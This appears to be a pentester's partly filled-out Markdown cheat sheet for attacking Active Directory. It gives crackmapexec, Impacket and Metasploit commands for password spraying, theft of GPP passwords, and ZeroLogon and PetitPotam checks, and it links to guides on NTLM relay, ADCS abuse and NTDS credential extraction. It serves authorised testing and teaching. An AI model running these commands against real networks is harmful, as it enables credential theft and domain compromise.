# Recon

# Unauthenticated enumeration

# First foothold
### Username == password
Using crackmapexec to test for password equal to username on domain contoso.com

```
for word in $(cat users.txt); do crackmapexec smb 10.10.0.10 -u $word -p $word -d contoso.com; done
```

### Checking NLA

# Authenticated enumeration


### Active Directory user description
Using crackmapexec to get active directory user description
```
crackmapexec ldap 10.10.0.10 -u jdoe -p Pass1234 -d company.com -M get-desc-users
```

### Resetting expired passwords remotely
- https://www.n00py.io/2021/09/resetting-expired-passwords-remotely/

### Machine Account Quota
```
crackmapexec ldap 10.10.0.10 -u jdoe -p Pass1234 -d company.com -d gnb.ca -M MAQ
```

### Admin Count
```
crackmapexec ldap company.com -u 'jdoe' -p 'Pass1234' -d company.com --admin-count
```

### Checking GPP passwords
- https://pentestlab.blog/tag/gpp/
Using crackmapexec GPP module
```
crackmapexec smb 10.10.0.10 -u jdoe -p Pass1234 -d company.com -M gpp_password
```

Using Impackets Get-GPPPassword.py
```
python3 Get-GPPPassword.py company.com/jdoe:Pass1234@10.10.0.10
```

Using Metasploit module 
```
use auxiliary/scanner/smb/smb_enum_gpp
msf auxiliary(smb_enum_gpp) > set rhosts 192.168.0.10
msf auxiliary(smb_enum_gpp) > set smbuser jdoe
msf auxiliary(smb_enum_gpp) > set smbpass Pass1234
msf auxiliary(smb_enum_gpp) > exploit
```

### Checking GPP autologin
```
crackmapexec smb 10.10.0.10 -u jdoe -p Pass1234 -d company.com -M gpp_autologin
```

### Checking share
Checking share access rights with domain user
```
crackmapexec smb 10.10.0.10 -u jdoe -p Pass1234 -d company.com --shares
```

### Print spooler service
Checking if print spooler service is enable using impacket RPCDUMP or crackmapexec (used RPCDUMP but can be used to scan on large range)
```
python3 rpcdump.py company.com/jdoe:Pass1234@10.10.0.10 | grep 'MS-RPRN\|MS-PAR'
crackmapexec smb rangeIP.txt -u jdoe -p Pass1234 -d company.com -M spooler | grep Spooler
```


### Local admin brute force
- https://github.com/InfosecMatter/Minimalistic-offensive-security-tools/blob/master/localbrute.ps1 (a améliorer)


### Expanding BloodHound
- https://github.com/hausec/Bloodhound-Custom-Queries
- https://hausec.com/2019/09/09/bloodhound-cypher-cheatsheet/
- https://www.trustedsec.com/blog/expanding-the-hound-introducing-plaintext-field-to-compromised-accounts/
- https://neo4j.com/docs/api/python-driver/current/


# Exploitation

### Exploiting GPO
- https://github.com/Group3r/Group3rhttps://github.com/Group3r/Group3r

### Protected Process 
- https://itm4n.github.io/lsass-runasppl/

### Protected 

### PAC
Check if the DC is vulnerable to CVE-2021-42278 and CVE-2021-42287 to impersonate DA from standard domain user

### ProxyLogon

### ProxyShell

### ZeroLogon

```
crackmapexec smb 10.10.0.10 -u jdoe -p Pass1234 -d company.com -M zerologon
```

### PrintNightmare

### Petitpotam
PetitPotam, publicly disclosed by French security researcher Lionel Gilles, is comparable to the PrintSpooler bug but utilizes the **MS-EFSRPC** API to coerce authentication rather than **MS-RPRN**. 

Check to validate host is vulnerable to petitpotam
```
crackmapexec smb 10.10.0.10 -u jdoe -p Pass1234 -d company.com -M petitpotam
```
### samAccountName spoofing

# Active Directory exploitation

---> CHECKER RAPPORT Vulns pentest interne (privileged groups, machineAccountQuota, publication Linkedin groupe membership tenable)

### Exploiting ADCS
Find PKI Enrollment Services in Active Directory and Certificate Templates Names
```
crackmapexec ldap 10.10.0.10 -u jdoe -p Pass1234 -d company.com -M adcs
certutil.exe -config - -ping
```

- https://ppn.snovvcrash.rocks/pentest/infrastructure/ad/ad-cs-abuse
- https://github.com/PKISolutions/PSPKI
- https://www.exandroid.dev/2021/06/23/ad-cs-relay-attack-practical-guide/

#### ADCS WebDav + NTLM relay to LDAP
- https://twitter.com/tifkin_/status/1418855927575302144/photo/1
- https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/adcs-+-petitpotam-ntlm-relay-obtaining-krbtgt-hash-with-domain-controller-machine-certificate#rbcd-remote-computer-takeover

# Persistence

# Post-Exploitation

### Active Directory NTDS : Clear Text passwords (Reversible encryption)
Sometimes when using [secretsdump.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/secretsdump.py) to extract NTDS.dit you will encounter some CLEARTEXT credential wihtin the dump.   

Cleartext does not really mean that the passwords are stored as is. They are stored in an encrypted form using **RC4** encryption.   

The key used to both encrypt and decrypt is the **SYSKEY**, which is stored in the registry and can be extracted by a domain admin.This means the hashes can be trivially reversed to the cleartext values, hence the term “reversible encryption”.

List users with "Store passwords using reversible encryption" enabled
```
Get-ADUser -Filter 'userAccountControl -band 128' -Properties userAccountControl
```

<img src="./images/store-password-using-reversible-encryption.png" width="500"/>

## Data-Exfiltration
Data exfiltration and DLP (Data Loss Prevention) bypass.

# Reporting / Collaborative


### Resources
#### PetitPotam and ADCS
- https://www.optiv.com/insights/source-zero/blog/petitpotam-active-directory-certificate-services


To use for the course
- https://www.infosecmatter.com/top-16-active-directory-vulnerabilities/